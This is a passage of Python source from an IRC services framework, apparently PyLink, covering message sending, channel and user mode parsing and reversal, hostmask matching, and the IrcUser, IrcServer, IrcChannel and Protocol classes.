                          hook_args)
                continue

    def _send(self, data):
        """"""Sends raw text to the uplink server.""""""
        # Safeguard against newlines in input!! Otherwise, each line gets
        # treated as a separate command, which is particularly nasty.
        data = data.replace('\n', ' ')
        data = data.encode(""utf-8"") + b""\n""
        stripped_data = data.decode(""utf-8"").strip(""\n"")
        log.debug(""(%s) -> %s"", self.name, stripped_data)

        try:
            self.socket.send(data)
        except (OSError, AttributeError):
            log.debug(""(%s) Dropping message %r; network isn't connected!"", self.name, stripped_data)

    def send(self, data, queue=True):
        """"""send() wrapper with optional queueing support.""""""
        if queue:
            self.queue.append(data)
        else:
            self._send(data)

    def schedulePing(self):
        """"""Schedules periodic pings in a loop.""""""
        self.proto.ping()

        self.pingTimer = threading.Timer(self.pingfreq, self.schedulePing)
        self.pingTimer.daemon = True
        self.pingTimer.name = 'Ping timer loop for %s' % self.name
        self.pingTimer.start()

        log.debug('(%s) Ping scheduled at %s', self.name, time.time())

    def __repr__(self):
        return ""<classes.Irc object for %r>"" % self.name

    ### General utility functions
    def callCommand(self, source, text):
        """"""
        Calls a PyLink bot command. source is the caller's UID, and text is the
        full, unparsed text of the message.
        """"""
        world.services['pylink'].call_cmd(self, source, text)

    def msg(self, target, text, notice=None, source=None, loopback=True):
        """"""Handy function to send messages/notices to clients. Source
        is optional, and defaults to the main PyLink client if not specified.""""""
        if not text:
            return

        if not (source or self.pseudoclient):
            # No explicit source set and our main client wasn't available; abort.
            return
        source = source or self.pseudoclient.uid

        if notice:
            self.proto.notice(source, target, text)
            cmd = 'PYLINK_SELF_NOTICE'
        else:
            self.proto.message(source, target, text)
            cmd = 'PYLINK_SELF_PRIVMSG'

        if loopback:
            # Determines whether we should send a hook for this msg(), to relay things like services
            # replies across relay.
            self.callHooks([source, cmd, {'target': target, 'text': text}])

    def _reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,
            loopback=True):
        """"""
        Core of the reply() function - replies to the last caller in the right context
        (channel or PM).
        """"""
        if private is None:
            # Allow using private replies as the default, if no explicit setting was given.
            private = conf.conf['bot'].get(""prefer_private_replies"")

        # Private reply is enabled, or the caller was originally a PM
        if private or (self.called_in in self.users):
            if not force_privmsg_in_private:
                # For private replies, the default is to override the notice=True/False argument,
                # and send replies as notices regardless. This is standard behaviour for most
                # IRC services, but can be disabled if force_privmsg_in_private is given.
                notice = True
            target = self.called_by
        else:
            target = self.called_in

        self.msg(target, text, notice=notice, source=source, loopback=loopback)

    def reply(self, *args, **kwargs):
        """"""
        Replies to the last caller in the right context (channel or PM).

        This function wraps around _reply() and can be monkey-patched in a thread-safe manner
        to temporarily redirect plugin output to another target.
        """"""
        with self.reply_lock:
            self._reply(*args, **kwargs)

    def error(self, text, **kwargs):
        """"""Replies with an error to the last caller in the right context (channel or PM).""""""
        # This is a stub to alias error to reply
        self.reply(""Error: %s"" % text, **kwargs)

    def toLower(self, text):
        """"""Returns a lowercase representation of text based on the IRC object's
        casemapping (rfc1459 or ascii).""""""
        if self.proto.casemapping == 'rfc1459':
            text = text.replace('{', '[')
            text = text.replace('}', ']')
            text = text.replace('|', '\\')
            text = text.replace('~', '^')
        # Encode the text as bytes first, and then lowercase it so that only ASCII characters are
        # changed. Unicode in channel names, etc. is case sensitive because IRC is just that old of
        # a protocol!!!
        return text.encode().lower().decode()

    def parseModes(self, target, args):
        """"""Parses a modestring list into a list of (mode, argument) tuples.
        ['+mitl-o', '3', 'person'] => [('+m', None), ('+i', None), ('+t', None), ('+l', '3'), ('-o', 'person')]
        """"""
        # http://www.irc.org/tech_docs/005.html
        # A = Mode that adds or removes a nick or address to a list. Always has a parameter.
        # B = Mode that changes a setting and always has a parameter.
        # C = Mode that changes a setting and only has a parameter when set.
        # D = Mode that changes a setting and never has a parameter.

        if type(args) == str:
            # If the modestring was given as a string, split it into a list.
            args = args.split()

        assert args, 'No valid modes were supplied!'
        usermodes = not utils.isChannel(target)
        prefix = ''
        modestring = args[0]
        args = args[1:]
        if usermodes:
            log.debug('(%s) Using self.umodes for this query: %s', self.name, self.umodes)

            if target not in self.users:
                log.debug('(%s) Possible desync! Mode target %s is not in the users index.', self.name, target)
                return []  # Return an empty mode list

            supported_modes = self.umodes
            oldmodes = self.users[target].modes
        else:
            log.debug('(%s) Using self.cmodes for this query: %s', self.name, self.cmodes)

            supported_modes = self.cmodes
            oldmodes = self.channels[target].modes
        res = []
        for mode in modestring:
            if mode in '+-':
                prefix = mode
            else:
                if not prefix:
                    prefix = '+'
                arg = None
                log.debug('Current mode: %s%s; args left: %s', prefix, mode, args)
                try:
                    if mode in self.prefixmodes and not usermodes:
                        # We're setting a prefix mode on someone (e.g. +o user1)
                        log.debug('Mode %s: This mode is a prefix mode.', mode)
                        arg = args.pop(0)
                        # Convert nicks to UIDs implicitly; most IRCds will want
                        # this already.
                        arg = self.nickToUid(arg) or arg
                        if arg not in self.users:  # Target doesn't exist, skip it.
                            log.debug('(%s) Skipping setting mode ""%s %s""; the '
                                      'target doesn\'t seem to exist!', self.name,
                                      mode, arg)
                            continue
                    elif mode in (supported_modes['*A'] + supported_modes['*B']):
                        # Must have parameter.
                        log.debug('Mode %s: This mode must have parameter.', mode)
                        arg = args.pop(0)
                        if prefix == '-':
                            if mode in supported_modes['*B'] and arg == '*':
                                # Charybdis allows unsetting +k without actually
                                # knowing the key by faking the argument when unsetting
                                # as a single ""*"".
                                # We'd need to know the real argument of +k for us to
                                # be able to unset the mode.
                                oldarg = dict(oldmodes).get(mode)
                                if oldarg:
                                    # Set the arg to the old one on the channel.
                                    arg = oldarg
                                    log.debug(""Mode %s: coersing argument of '*' to %r."", mode, arg)

                            log.debug('(%s) parseModes: checking if +%s %s is in old modes list: %s', self.name, mode, arg, oldmodes)

                            if (mode, arg) not in oldmodes:
                                # Ignore attempts to unset bans that don't exist.
                                log.debug(""(%s) parseModes(): ignoring removal of non-existent list mode +%s %s"", self.name, mode, arg)
                                continue

                    elif prefix == '+' and mode in supported_modes['*C']:
                        # Only has parameter when setting.
                        log.debug('Mode %s: Only has parameter when setting.', mode)
                        arg = args.pop(0)
                except IndexError:
                    log.warning('(%s/%s) Error while parsing mode %r: mode requires an '
                                'argument but none was found. (modestring: %r)',
                                self.name, target, mode, modestring)
                    continue  # Skip this mode; don't error out completely.
                res.append((prefix + mode, arg))
        return res

    def applyModes(self, target, changedmodes):
        """"""Takes a list of parsed IRC modes, and applies them on the given target.

        The target can be either a channel or a user; this is handled automatically.""""""
        usermodes = not utils.isChannel(target)
        log.debug('(%s) Using usermodes for this query? %s', self.name, usermodes)

        try:
            if usermodes:
                old_modelist = self.users[target].modes
                supported_modes = self.umodes
            else:
                old_modelist = self.channels[target].modes
                supported_modes = self.cmodes
        except KeyError:
            log.warning('(%s) Possible desync? Mode target %s is unknown.', self.name, target)
            return

        modelist = set(old_modelist)
        log.debug('(%s) Applying modes %r on %s (initial modelist: %s)', self.name, changedmodes, target, modelist)
        for mode in changedmodes:
            # Chop off the +/- part that parseModes gives; it's meaningless for a mode list.
            try:
                real_mode = (mode[0][1], mode[1])
            except IndexError:
                real_mode = mode

            if not usermodes:
                # We only handle +qaohv for now. Iterate over every supported mode:
                # if the IRCd supports this mode and it is the one being set, add/remove
                # the person from the corresponding prefix mode list (e.g. c.prefixmodes['op']
                # for ops).
                for pmode, pmodelist in self.channels[target].prefixmodes.items():
                    if pmode in self.cmodes and real_mode[0] == self.cmodes[pmode]:
                        log.debug('(%s) Initial prefixmodes list: %s', self.name, pmodelist)
                        if mode[0][0] == '+':
                            pmodelist.add(mode[1])
                        else:
                            pmodelist.discard(mode[1])

                        log.debug('(%s) Final prefixmodes list: %s', self.name, pmodelist)

                if real_mode[0] in self.prefixmodes:
                    # Don't add prefix modes to IrcChannel.modes; they belong in the
                    # prefixmodes mapping handled above.
                    log.debug('(%s) Not adding mode %s to IrcChannel.modes because '
                              'it\'s a prefix mode.', self.name, str(mode))
                    continue

            if mode[0][0] != '-':
                # We're adding a mode
                existing = [m for m in modelist if m[0] == real_mode[0] and m[1] != real_mode[1]]
                if existing and real_mode[1] and real_mode[0] not in self.cmodes['*A']:
                    # The mode we're setting takes a parameter, but is not a list mode (like +beI).
                    # Therefore, only one version of it can exist at a time, and we must remove
                    # any old modepairs using the same letter. Otherwise, we'll get duplicates when,
                    # for example, someone sets mode ""+l 30"" on a channel already set ""+l 25"".
                    log.debug('(%s) Old modes for mode %r exist on %s, removing them: %s',
                              self.name, real_mode, target, str(existing))
                    [modelist.discard(oldmode) for oldmode in existing]
                modelist.add(real_mode)
                log.debug('(%s) Adding mode %r on %s', self.name, real_mode, target)
            else:
                log.debug('(%s) Removing mode %r on %s', self.name, real_mode, target)
                # We're removing a mode
                if real_mode[1] is None:
                    # We're removing a mode that only takes arguments when setting.
                    # Remove all mode entries that use the same letter as the one
                    # we're unsetting.
                    for oldmode in modelist.copy():
                        if oldmode[0] == real_mode[0]:
                            modelist.discard(oldmode)
                else:
                    modelist.discard(real_mode)
        log.debug('(%s) Final modelist: %s', self.name, modelist)
        try:
            if usermodes:
                self.users[target].modes = modelist
            else:
                self.channels[target].modes = modelist
        except KeyError:
            log.warning(""(%s) Invalid MODE target %s (usermodes=%s)"", self.name, target, usermodes)

    @staticmethod
    def _flip(mode):
        """"""Flips a mode character.""""""
        # Make it a list first, strings don't support item assignment
        mode = list(mode)
        if mode[0] == '-':  # Query is something like ""-n""
            mode[0] = '+'  # Change it to ""+n""
        elif mode[0] == '+':
            mode[0] = '-'
        else:  # No prefix given, assume +
            mode.insert(0, '-')
        return ''.join(mode)

    def reverseModes(self, target, modes, oldobj=None):
        """"""Reverses/Inverts the mode string or mode list given.

        Optionally, an oldobj argument can be given to look at an earlier state of
        a channel/user object, e.g. for checking the op status of a mode setter
        before their modes are processed and added to the channel state.

        This function allows both mode strings or mode lists. Example uses:
            ""+mi-lk test => ""-mi+lk test""
            ""mi-k test => ""-mi+k test""
            [('+m', None), ('+r', None), ('+l', '3'), ('-o', 'person')
             => {('-m', None), ('-r', None), ('-l', None), ('+o', 'person')})
            {('s', None), ('+o', 'whoever') => {('-s', None), ('-o', 'whoever')})
        """"""
        origtype = type(modes)
        # If the query is a string, we have to parse it first.
        if origtype == str:
            modes = self.parseModes(target, modes.split("" ""))
        # Get the current mode list first.
        if utils.isChannel(target):
            c = oldobj or self.channels[target]
            oldmodes = c.modes.copy()
            possible_modes = self.cmodes.copy()
            # For channels, this also includes the list of prefix modes.
            possible_modes['*A'] += ''.join(self.prefixmodes)
            for name, userlist in c.prefixmodes.items():
                try:
                    oldmodes.update([(self.cmodes[name], u) for u in userlist])
                except KeyError:
                    continue
        else:
            oldmodes = self.users[target].modes
            possible_modes = self.umodes
        newmodes = []
        log.debug('(%s) reverseModes: old/current mode list for %s is: %s', self.name,
                   target, oldmodes)
        for char, arg in modes:
            # Mode types:
            # A = Mode that adds or removes a nick or address to a list. Always has a parameter.
            # B = Mode that changes a setting and always has a parameter.
            # C = Mode that changes a setting and only has a parameter when set.
            # D = Mode that changes a setting and never has a parameter.
            mchar = char[-1]
            if mchar in possible_modes['*B'] + possible_modes['*C']:
                # We need to find the current mode list, so we can reset arguments
                # for modes that have arguments. For example, setting +l 30 on a channel
                # that had +l 50 set should give ""+l 30"", not ""-l"".
                oldarg = [m for m in oldmodes if m[0] == mchar]
                if oldarg:  # Old mode argument for this mode existed, use that.
                    oldarg = oldarg[0]
                    mpair = ('+%s' % oldarg[0], oldarg[1])
                else:  # Not found, flip the mode then.
                    # Mode takes no arguments when unsetting.
                    if mchar in possible_modes['*C'] and char[0] != '-':
                        arg = None
                    mpair = (self._flip(char), arg)
            else:
                mpair = (self._flip(char), arg)
            if char[0] != '-' and (mchar, arg) in oldmodes:
                # Mode is already set.
                log.debug(""(%s) reverseModes: skipping reversing '%s %s' with %s since we're ""
                          ""setting a mode that's already set."", self.name, char, arg, mpair)
                continue
            elif char[0] == '-' and (mchar, arg) not in oldmodes and mchar in possible_modes['*A']:
                # We're unsetting a prefixmode that was never set - don't set it in response!
                # Charybdis lacks verification for this server-side.
                log.debug(""(%s) reverseModes: skipping reversing '%s %s' with %s since it ""
                          ""wasn't previously set."", self.name, char, arg, mpair)
                continue
            newmodes.append(mpair)

        log.debug('(%s) reverseModes: new modes: %s', self.name, newmodes)
        if origtype == str:
            # If the original query is a string, send it back as a string.
            return self.joinModes(newmodes)
        else:
            return set(newmodes)

    @staticmethod
    def joinModes(modes, sort=False):
        """"""Takes a list of (mode, arg) tuples in parseModes() format, and
        joins them into a string.

        See testJoinModes in tests/test_utils.py for some examples.""""""
        prefix = '+'  # Assume we're adding modes unless told otherwise
        modelist = ''
        args = []

        # Sort modes alphabetically like a conventional IRCd.
        if sort:
            modes = sorted(modes)

        for modepair in modes:
            mode, arg = modepair
            assert len(mode) in (1, 2), ""Incorrect length of a mode (received %r)"" % mode
            try:
                # If the mode has a prefix, use that.
                curr_prefix, mode = mode
            except ValueError:
                # If not, the current prefix stays the same; move on to the next
                # modepair.
                pass
            else:
                # If the prefix of this mode isn't the same as the last one, add
                # the prefix to the modestring. This prevents '+nt-lk' from turning
                # into '+n+t-l-k' or '+ntlk'.
                if prefix != curr_prefix:
                    modelist += curr_prefix
                    prefix = curr_prefix
            modelist += mode
            if arg is not None:
                args.append(arg)
        if not modelist.startswith(('+', '-')):
            # Our starting mode didn't have a prefix with it. Assume '+'.
            modelist = '+' + modelist
        if args:
            # Add the args if there are any.
            modelist += ' %s' % ' '.join(args)
        return modelist

    @classmethod
    def wrapModes(cls, modes, limit, max_modes_per_msg=0):
        """"""
        Takes a list of modes and wraps it across multiple lines.
        """"""
        strings = []

        # This process is slightly trickier than just wrapping arguments, because modes create
        # positional arguments that can't be separated from its character.
        queued_modes = []
        total_length = 0

        last_prefix = '+'
        orig_modes = modes.copy()
        modes = list(modes)
        while modes:
            # PyLink mode lists come in the form [('+t', None), ('-b', '*!*@someone'), ('+l', 3)]
            # The +/- part is optional depending on context, and should either:
            # 1) The prefix of the last mode.
            # 2) + (adding modes), if no prefix was ever given
            next_mode = modes.pop(0)

            modechar, arg = next_mode
            prefix = modechar[0]
            if prefix not in '+-':
                prefix = last_prefix
                # Explicitly add the prefix to the mode character to prevent
                # ambiguity when passing it to joinModes().
                modechar = prefix + modechar
                # XXX: because tuples are immutable, we have to replace the entire modepair..
                next_mode = (modechar, arg)

            # Figure out the length that the next mode will add to the buffer. If we're changing
            # from + to - (setting to removing modes) or vice versa, we'll need two characters
            # (""+"" or ""-"") plus the mode char itself.
            next_length = 1
            if prefix != last_prefix:
                next_length += 1

            # Replace the last_prefix with the current one for the next iteration.
            last_prefix = prefix

            if arg:
                # This mode has an argument, so add the length of that and a space.
                next_length += 1
                next_length += len(arg)

            assert next_length <= limit, \
                ""wrapModes: Mode %s is too long for the given length %s"" % (next_mode, limit)

            # Check both message length and max. modes per msg if enabled.
            if (next_length + total_length) <= limit and ((not max_modes_per_msg) or len(queued_modes) < max_modes_per_msg):
                # We can fit this mode in the next message; add it.
                total_length += next_length
                log.debug('wrapModes: Adding mode %s to queued modes', str(next_mode))
                queued_modes.append(next_mode)
                log.debug('wrapModes: queued modes: %s', queued_modes)
            else:
                # Otherwise, create a new message by joining the previous queue.
                # Then, add our current mode.
                strings.append(cls.joinModes(queued_modes))
                queued_modes.clear()

                log.debug('wrapModes: cleared queue (length %s) and now adding %s', limit, str(next_mode))
                queued_modes.append(next_mode)
                total_length = next_length
        else:
            # Everything fit in one line, so just use that.
            strings.append(cls.joinModes(queued_modes))

        log.debug('wrapModes: returning %s for %s', strings, orig_modes)
        return strings

    def version(self):
        """"""
        Returns a detailed version string including the PyLink daemon version,
        the protocol module in use, and the server hostname.
        """"""
        fullversion = 'PyLink-%s. %s :[protocol:%s]' % (__version__, self.hostname(), self.protoname)
        return fullversion

    def hostname(self):
        """"""
        Returns the server hostname used by PyLink on the given server.
        """"""
        return self.serverdata.get('hostname', world.fallback_hostname)

    ### State checking functions
    def nickToUid(self, nick):
        """"""Looks up the UID of a user with the given nick, if one is present.""""""
        nick = self.toLower(nick)
        for k, v in self.users.copy().items():
            if self.toLower(v.nick) == nick:
                return k

    def isInternalClient(self, numeric):
        """"""
        Returns whether the given client numeric (UID) is a PyLink client.
        """"""
        sid = self.getServer(numeric)
        if sid and self.servers[sid].internal:
            return True
        return False

    def isInternalServer(self, sid):
        """"""Returns whether the given SID is an internal PyLink server.""""""
        return (sid in self.servers and self.servers[sid].internal)

    def getServer(self, numeric):
        """"""Finds the SID of the server a user is on.""""""
        userobj = self.users.get(numeric)
        if userobj:
            return userobj.server

    def isManipulatableClient(self, uid):
        """"""
        Returns whether the given user is marked as an internal, manipulatable
        client. Usually, automatically spawned services clients should have this
        set True to prevent interactions with opers (like mode changes) from
        causing desyncs.
        """"""
        return self.isInternalClient(uid) and self.users[uid].manipulatable

    def getServiceBot(self, uid):
        """"""
        Checks whether the given UID is a registered service bot. If True,
        returns the cooresponding ServiceBot object.
        """"""
        userobj = self.users.get(uid)
        if not userobj:
            return False

        # Look for the ""service"" attribute in the IrcUser object, if one exists.
        try:
            sname = userobj.service
            # Warn if the service name we fetched isn't a registered service.
            if sname not in world.services.keys():
                log.warning(""(%s) User %s / %s had a service bot record to a service that doesn't ""
                            ""exist (%s)!"", self.name, uid, userobj.nick, sname)
            return world.services.get(sname)
        except AttributeError:
            return False

    def getHostmask(self, user, realhost=False, ip=False):
        """"""
        Returns the hostmask of the given user, if present. If the realhost option
        is given, return the real host of the user instead of the displayed host.
        If the ip option is given, return the IP address of the user (this overrides
        realhost).""""""
        userobj = self.users.get(user)

        try:
            nick = userobj.nick
        except AttributeError:
            nick = '<unknown-nick>'

        try:
            ident = userobj.ident
        except AttributeError:
            ident = '<unknown-ident>'

        try:
            if ip:
                host = userobj.ip
            elif realhost:
                host = userobj.realhost
            else:
                host = userobj.host
        except AttributeError:
            host = '<unknown-host>'

        return '%s!%s@%s' % (nick, ident, host)

    def getFriendlyName(self, entityid):
        """"""
        Returns the friendly name of a SID or UID (server name for SIDs, nick for UID).
        """"""
        if entityid in self.servers:
            return self.servers[entityid].name
        elif entityid in self.users:
            return self.users[entityid].nick
        else:
            raise KeyError(""Unknown UID/SID %s"" % entityid)

    def getFullNetworkName(self):
        """"""
        Returns the full network name (as defined by the ""netname"" option), or the
        short network name if that isn't defined.
        """"""
        return self.serverdata.get('netname', self.name)

    def isOper(self, uid, allowAuthed=True, allowOper=True):
        """"""
        Returns whether the given user has operator status on PyLink. This can be achieved
        by either identifying to PyLink as admin (if allowAuthed is True),
        or having user mode +o set (if allowOper is True). At least one of
        allowAuthed or allowOper must be True for this to give any meaningful
        results.
        """"""
        if uid in self.users:
            if allowOper and (""o"", None) in self.users[uid].modes:
                return True
            elif allowAuthed and self.users[uid].account:
                return True
        return False

    def checkAuthenticated(self, uid, allowAuthed=True, allowOper=True):
        """"""
        Checks whether the given user has operator status on PyLink, raising
        NotAuthorizedError and logging the access denial if not.
        """"""
        log.warning(""(%s) Irc.checkAuthenticated() is deprecated as of PyLink 1.2 and may be ""
                    ""removed in a future relase. Consider migrating to the PyLink Permissions API."",
                    self.name)
        lastfunc = inspect.stack()[1][3]
        if not self.isOper(uid, allowAuthed=allowAuthed, allowOper=allowOper):
            log.warning('(%s) Access denied for %s calling %r', self.name,
                        self.getHostmask(uid), lastfunc)
            raise utils.NotAuthorizedError(""You are not authenticated!"")
        return True

    def matchHost(self, glob, target, ip=True, realhost=True):
        """"""
        Checks whether the given host, or given UID's hostmask matches the given nick!user@host
        glob.

        If the target given is a UID, and the 'ip' or 'realhost' options are True, this will also
        match against the target's IP address and real host, respectively.

        This function respects IRC casemappings (rfc1459 and ascii). If the given target is a UID,
        and the 'ip' option is enabled, the host portion of the glob is also matched as a CIDR
        range.
        """"""
        # Get the corresponding casemapping value used by ircmatch.
        if self.proto.casemapping == 'rfc1459':
            casemapping = 0
        else:
            casemapping = 1

        # Try to convert target into a UID. If this fails, it's probably a hostname.
        target = self.nickToUid(target) or target

        # Prepare a list of hosts to check against.
        if target in self.users:
            if glob.startswith(('$', '!$')):
                # !$exttarget inverts the given match.
                invert = glob.startswith('!$')

                # Exttargets start with $. Skip regular ban matching and find the matching ban handler.
                glob = glob.lstrip('$!')
                exttargetname = glob.split(':', 1)[0]
                handler = world.exttarget_handlers.get(exttargetname)

                if handler:
                    # Handler exists. Return what it finds.
                    result = handler(self, glob, target)
                    log.debug('(%s) Got %s from exttarget %s in matchHost() glob $%s for target %s',
                              self.name, result, exttargetname, glob, target)
                    if invert:  # Anti-exttarget was specified.
                        result = not result
                    return result
                else:
                    log.debug('(%s) Unknown exttarget %s in matchHost() glob $%s', self.name,
                              exttargetname, glob)
                    return False

            hosts = {self.getHostmask(target)}

            if ip:
                hosts.add(self.getHostmask(target, ip=True))

                # HACK: support CIDR hosts in the hosts portion
                try:
                    header, cidrtarget = glob.split('@', 1)
                    log.debug('(%s) Processing CIDRs for %s (full host: %s)', self.name,
                              cidrtarget, glob)
                    # Try to parse the host portion as a CIDR range
                    network = ipaddress.ip_network(cidrtarget)

                    log.debug('(%s) Found CIDR for %s, replacing target host with IP %s', self.name,
                              realhost, target)
                    real_ip = self.users[target].ip
                    if ipaddress.ip_address(real_ip) in network:
                        # If the CIDR matches, hack around the host matcher by pretending that
                        # the lookup target was the IP and not the CIDR range!
                        glob = '@'.join((header, real_ip))
                except ValueError:
                    pass

            if realhost:
                hosts.add(self.getHostmask(target, realhost=True))

        else:  # We were given a host, use that.
            hosts = [target]

        # Iterate over the hosts to match using ircmatch.
        for host in hosts:
            if ircmatch.match(casemapping, glob, host):
                return True

        return False

class IrcUser():
    """"""PyLink IRC user class.""""""
    def __init__(self, nick, ts, uid, server, ident='null', host='null',
                 realname='PyLink dummy client', realhost='null',
                 ip='0.0.0.0', manipulatable=False, opertype='IRC Operator'):
        self.nick = nick
        self.ts = ts
        self.uid = uid
        self.ident = ident
        self.host = host
        self.realhost = realhost
        self.ip = ip
        self.realname = realname
        self.modes = set()  # Tracks user modes
        self.server = server

        # Tracks PyLink identification status
        self.account = ''

        # Tracks oper type (for display only)
        self.opertype = opertype

        # Tracks external services identification status
        self.services_account = ''

        # Tracks channels the user is in
        self.channels = set()

        # Tracks away message status
        self.away = ''

        # This sets whether the client should be marked as manipulatable.
        # Plugins like bots.py's commands should take caution against
        # manipulating these ""protected"" clients, to prevent desyncs and such.
        # For ""serious"" service clients, this should always be False.
        self.manipulatable = manipulatable

    def __repr__(self):
        return 'IrcUser(%s/%s)' % (self.uid, self.nick)

class IrcServer():
    """"""PyLink IRC server class.

    uplink: The SID of this IrcServer instance's uplink. This is set to None
            for the main PyLink PseudoServer!
    name: The name of the server.
    internal: Whether the server is an internal PyLink PseudoServer.
    """"""

    def __init__(self, uplink, name, internal=False, desc=""(None given)""):
        self.uplink = uplink
        self.users = set()
        self.internal = internal
        self.name = name.lower()
        self.desc = desc

    def __repr__(self):
        return 'IrcServer(%s)' % self.name

class IrcChannel():
    """"""PyLink IRC channel class.""""""
    def __init__(self, name=None):
        # Initialize variables, such as the topic, user list, TS, who's opped, etc.
        self.users = set()
        self.modes = set()
        self.topic = ''
        self.ts = int(time.time())
        self.prefixmodes = {'op': set(), 'halfop': set(), 'voice': set(),
                            'owner': set(), 'admin': set()}

        # Determines whether a topic has been set here or not. Protocol modules
        # should set this.
        self.topicset = False

        # Saves the channel name (may be useful to plugins, etc.)
        self.name = name

    def __repr__(self):
        return 'IrcChannel(%s)' % self.name

    def removeuser(self, target):
        """"""Removes a user from a channel.""""""
        for s in self.prefixmodes.values():
            s.discard(target)
        self.users.discard(target)

    def deepcopy(self):
        """"""Returns a deep copy of the channel object.""""""
        return deepcopy(self)

    def isVoice(self, uid):
        """"""Returns whether the given user is voice in the channel.""""""
        return uid in self.prefixmodes['voice']

    def isHalfop(self, uid):
        """"""Returns whether the given user is halfop in the channel.""""""
        return uid in self.prefixmodes['halfop']

    def isOp(self, uid):
        """"""Returns whether the given user is op in the channel.""""""
        return uid in self.prefixmodes['op']

    def isAdmin(self, uid):
        """"""Returns whether the given user is admin (&) in the channel.""""""
        return uid in self.prefixmodes['admin']

    def isOwner(self, uid):
        """"""Returns whether the given user is owner (~) in the channel.""""""
        return uid in self.prefixmodes['owner']

    def isVoicePlus(self, uid):
        """"""Returns whether the given user is voice or above in the channel.""""""
        # If the user has any prefix mode, it has to be voice or greater.
        return bool(self.getPrefixModes(uid))

    def isHalfopPlus(self, uid):
        """"""Returns whether the given user is halfop or above in the channel.""""""
        for mode in ('halfop', 'op', 'admin', 'owner'):
            if uid in self.prefixmodes[mode]:
                return True
        return False

    def isOpPlus(self, uid):
        """"""Returns whether the given user is op or above in the channel.""""""
        for mode in ('op', 'admin', 'owner'):
            if uid in self.prefixmodes[mode]:
                return True
        return False

    @staticmethod
    def sortPrefixes(key):
        """"""
        Implements a sorted()-compatible sorter for prefix modes, giving each one a
        numeric value.
        """"""
        values = {'owner': 100, 'admin': 10, 'op': 5, 'halfop': 4, 'voice': 3}

        # Default to highest value (1000) for unknown modes, should we choose to
        # support them.
        return values.get(key, 1000)

    def getPrefixModes(self, uid, prefixmodes=None):
        """"""Returns a list of all named prefix modes the given user has in the channel.

        Optionally, a prefixmodes argument can be given to look at an earlier state of
        the channel's prefix modes mapping, e.g. for checking the op status of a mode
        setter before their modes are processed and added to the channel state.
        """"""

        if uid not in self.users:
            raise KeyError(""User %s does not exist or is not in the channel"" % uid)

        result = []
        prefixmodes = prefixmodes or self.prefixmodes

        for mode, modelist in prefixmodes.items():
            if uid in modelist:
                result.append(mode)

        return sorted(result, key=self.sortPrefixes)

class Protocol():
    """"""Base Protocol module class for PyLink.""""""
    def __init__(self, irc):
        self.irc = irc
        self.casemapping = 'rfc1459'
        self.hook_map = {}

        # Lock for updateTS to make sure only one thread can change the channel TS at one time.
        self.ts_lock = threading.Lock()

        # Lists required conf keys for the server block.
        self.conf_keys = {'ip', 'port', 'hostname', 'sid', 'sidrange', 'protocol', 'sendpass',
                          'recvpass'}

        # Defines a set of PyLink protocol capabilities
        self.protocol_caps = set()

    def validateServerConf(self):
        """"""Validates that the server block given contains the required keys.""""""
        for k in self.conf_keys:
            assert k in self.irc.serverdata, ""Missing option %r in server block for network %s."" % (k, self.irc.name)

        port = self.irc.serverdata['port']
        assert type(port) == int and 0 < port < 65535, ""Invalid port %r for network %s"" % (port, self.irc.name)

    @staticmethod
    def parseArgs(args):
        """"""
        Parses a string or list of of RFC1459-style arguments, where "":"" may
        be used for multi-word arguments that last until the end of a line.
        """"""
        if isinstance(args, str):
            args = args.split(' ')

        real_args = []
        for idx, arg in enumerate(args):
            if arg.startswith(':') and idx != 0:
                # "":"" is used to begin multi-word arguments that last until the end of the message.
                # Use list splicing here to join them into one argument, and then add it to our list of args.
                joined_arg = ' '.join(args[idx:])[1:]  # Cut off the leading : as well
                real_args.append(joined_arg)
                break
            real_args.append(arg)

        return real_args

    def hasCap(self, capab):
        """"""
        Returns whether this protocol module instance has the requested capability.
        """"""
        return capab.lower() in self.protocol_caps

    def removeClient(self, numeric):
        """"""Internal function to remove a client from our internal state.""""""
        for c, v in self.irc.channels.copy().items():
            v.removeuser(numeric)
            # Clear empty non-permanent channels.
            if not (self.irc.channels[c].users or ((self.irc.cmodes.get('permanent'), None) in self.irc.channels[c].modes)):
                del self.irc.channels[c]
            assert numeric not in v.users, ""IrcChannel's removeuser() is broken!""

        sid = self.irc.getServer(numeric)
        log.debug('Removing client %s from self.irc.users', numeric)
        del self.irc.users[numeric]
        log.debug('Removing client %s from self.irc.servers[%s].users', numeric, sid)
        self.irc.servers[sid].users.discard(numeric)

    def updateTS(self, sender, channel, their_ts, modes=[]):
        """"""
        Merges modes of a channel given the remote TS and a list of modes.
        """"""

        # Okay, so the situation is that we have 6 possible TS/sender combinations:

        #                       | our TS lower | TS equal | their TS lower
        # mode origin is us     |   OVERWRITE  |   MERGE  |    IGNORE
        # mode origin is uplink |    IGNORE    |   MERGE  |   OVERWRITE

        def _clear():
            log.debug(""(%s) Clearing local modes from channel %s due to TS change"", self.irc.name,
                      channel)
            self.irc.channels[channel].modes.clear()
            for p in self.irc.channels[channel].prefixmodes.values():
                for user in p.copy():
                    if not self.irc.isInternalClient(user):
                        p.discard(user)

        def _apply():
            if modes:
                log.debug(""(%s) Applying modes on channel %s (TS ok)"", self.irc.name,
                          channel)
                self.irc.applyModes(channel, modes)

        # Use a lock so only one thread can change a channel's TS at once: this prevents race
        # conditions from desyncing the channel list.
        with self.ts_lock:
            our_ts = self.irc.channels[channel].ts
            assert type(our_ts) == int, ""Wrong type for our_ts (expected int, got %s)"" % type(our_ts)
            assert type(their_ts) == int, ""Wrong type for their_ts (expected int, got %s)"" % type(their_ts)

            # Check if we're the mode sender based on the UID / SID given.
            our_mode = self.irc.isInternalClient(sender) or self.irc.isInternalServer(sender)

            log.debug(""(%s/%s) our_ts: %s; their_ts: %s; is the mode origin us? %s"", self.irc.name,
                      channel, our_ts, their_ts, our_mode)

            if their_ts == our_ts:
                log.debug(""(%s/%s) remote TS of %s is equal to our %s; mode query %s"",
                          self.irc.name, channel, their_ts, our_ts, modes)
                # Their TS is equal to ours. Merge modes.
                _apply()

            elif (their_ts < our_ts):
                if their_ts < 750000:
                    log.warning('(%s) Possible desync? Not setting bogus TS %s on channel %s', self.irc.name, their_ts, channel)
                else:
                    log.debug('(%s) Resetting channel TS of %s from %s to %s (remote has lower TS)',
                              self.irc.name, channel, our_ts, their_ts)
                    self.irc.channels[channel].ts = their_ts

                # Remote TS was lower and we're receiving modes. Clear the modelist and apply theirs.

                _clear()
                _apply()

    def _getSid(self, sname):
        """"""Returns the SID of a server with the given name, if present.""""""
        name = sname.lower()
